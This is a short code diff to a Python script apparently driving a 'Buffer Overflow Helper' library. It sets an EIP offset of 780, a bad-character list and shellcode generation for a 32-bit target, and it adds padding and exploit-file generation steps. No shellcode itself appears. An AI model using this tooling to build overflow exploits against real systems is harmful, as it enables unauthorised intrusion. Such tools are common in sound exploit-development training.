@@ -3,6 +3,8 @@ import argparse
 
 from BOFHelper import BOFHelper
 
+# TO-DO: 1. File generation; 2. Comments; 3. Egg hunter, first stage(is_register); 4. preload & postload
+
 if __name__ == "__main__":
     parser = argparse.ArgumentParser(description="The Ultimate Buffer Overflow Helper\n"
                                                  "This semi-automated utility can help you overflow any 32-bit machine"
@@ -37,3 +39,6 @@ if __name__ == "__main__":
     bof.set_eip_offset(780)
     bof.set_bad_chars(['00', '0a', '0d', '25', '26', '2b', '3d'])
     bof.generate_shellcode()
+    bof.set_esp_padding(4)
+    bof.expand_space()
+    bof.generate_file()
